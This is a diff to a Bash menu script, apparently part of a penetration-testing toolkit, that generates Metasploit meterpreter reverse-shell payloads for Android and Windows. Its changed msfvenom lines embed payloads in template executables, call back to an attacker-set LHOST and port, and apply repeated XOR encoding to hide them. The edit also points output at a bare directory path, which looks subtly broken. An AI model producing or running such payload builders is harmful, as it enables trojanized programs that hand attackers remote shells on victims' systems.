@@ -73,7 +73,6 @@ nb-shell-handlers-msf-listener() {
     echo "13. windows/x64/meterpreter_reverse_tcp"
     echo "14. Previous menu"
     echo
-    echo -n "Choice: "
     read choice
 
     case $choice in
@@ -140,8 +139,10 @@ nb-shell-handlers-msf-payload() {
               format="psh";;
          6) extention=".bin"
               format="raw";;
-         *) f_error;;
+        *) echo "Invalid option";;
     esac
+
+    clear
     
     __ask "Choose malicious payload:"
     echo "1.   android/meterpreter/reverse_tcp         (.apk)"
@@ -234,11 +235,11 @@ nb-shell-handlers-msf-payload() {
          14) payload="windows/x64/meterpreter_reverse_https"
               arch="x64"
               platform="windows"
-              f_format;;
+              format="exe";;
          15) payload="windows/x64/meterpreter_reverse_tcp"
               arch="x64"
               platform="windows"
-              f_format;;
+              format="exe";;
          16) exit;;
         *) echo "Invalid option";;
     esac
@@ -268,9 +269,9 @@ nb-shell-handlers-msf-payload() {
          fi
     
          echo
-         msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $home/data/$x-${__LPORT}-$iterations$extention
+         msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $HOME/desktop/server/
     else
          echo
-         msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $home/data/$x-${__LPORT}-$iterations$extention
+         msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $HOME/desktop/server/
     fi
 }
